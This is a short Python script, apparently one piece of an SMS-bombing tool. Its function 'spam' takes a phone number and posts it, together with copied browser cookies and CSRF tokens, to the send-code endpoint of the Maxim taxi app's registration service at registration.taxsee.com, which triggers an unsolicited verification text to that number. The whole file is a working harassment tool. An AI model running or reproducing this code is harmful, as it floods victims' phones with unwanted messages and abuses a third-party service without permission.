import requests, json
def spam(no):
    headers={
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection':'keep-alive',
        'Content-Length':'408',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie':'registration=0kgjcmekfhvp18hfvn752shu1n; __registration_tm_city_id=22c8d79309478c6f30168220190e4066e9d9a258b674484a1f5d6b90037c6e47a%3A2%3A%7Bi%3A0%3Bs%3A25%3A%22__registration_tm_city_id%22%3Bi%3A1%3Bi%3A37201%3B%7D; _csrf-registration=df4b77f6d5b765f1a2a66a256da654f4f6ddd0c6c7ebcfb6631c3b308535c8fda%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22_csrf-registration%22%3Bi%3A1%3Bs%3A32%3A%22J-xkSTDiNeukqleXBCLHGp8CZuZ9tXcO%22%3B%7D; _ym_uid=1595765749987533566; _ym_d=1595765749; _gcl_au=1.1.719620896.1595765749; _ym_visorc_54758941=w; tmr_lvid=560cb853efc6fdadd231f2c6d5682fd7; tmr_lvidTS=1595765750577; _ga=GA1.2.1768411415.1595765751; _gid=GA1.2.652520502.1595765751; _gat_gtag_UA_74934112_11=1; _ga=GA1.3.1768411415.1595765751; _gid=GA1.3.652520502.1595765751; _gat_UA-74934112-11=1; tmr_detect=1%7C1595765755897; tmr_reqNum=2; _ym_isad=1; __registration_tm_city_ru=2890922763c18b53e43825107f521add48de5a97391a183fff9541fdbcff1c94a%3A2%3A%7Bi%3A0%3Bs%3A25%3A%22__registration_tm_city_ru%22%3Bi%3A1%3Bi%3A6%3B%7D',
        'DNT':'1',
        'Host':'registration.taxsee.com',
        'Origin':'https://registration.taxsee.com',
        'Referer':'https://registration.taxsee.com/?app=maxim&intl=id-ID&b=4393',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
        'X-CSRF-Token':'-LYJ8QncpatA1YffLOlwj1t3ilRVZOWMbv5TC11-oLiym3GaWojhwg6w8rRdhRXXGTTGHBIU3c80iwkyKSbD9w==',
        'X-Requested-With':'XMLHttpRequest'
    }
    data={
        '_csrf-registration':'-LYJ8QncpatA1YffLOlwj1t3ilRVZOWMbv5TC11-oLiym3GaWojhwg6w8rRdhRXXGTTGHBIU3c80iwkyKSbD9w==',
        'RegistrationForm[place]':'29799',
        'RegistrationForm[phone]':no,
        'RegistrationForm[appCode]':'maxim',
        'RegistrationForm[code]':'',
        '_csrf-registration':'-LYJ8QncpatA1YffLOlwj1t3ilRVZOWMbv5TC11-oLiym3GaWojhwg6w8rRdhRXXGTTGHBIU3c80iwkyKSbD9w==',
        'udid':'db94aea2409dae69effeaf0f2e687710'
    }
    if json.loads(requests.post('https://registration.taxsee.com/id/id-ID/registration/send-code/', data=data, headers=headers).text)['success'] == True:
        True
    else:
        False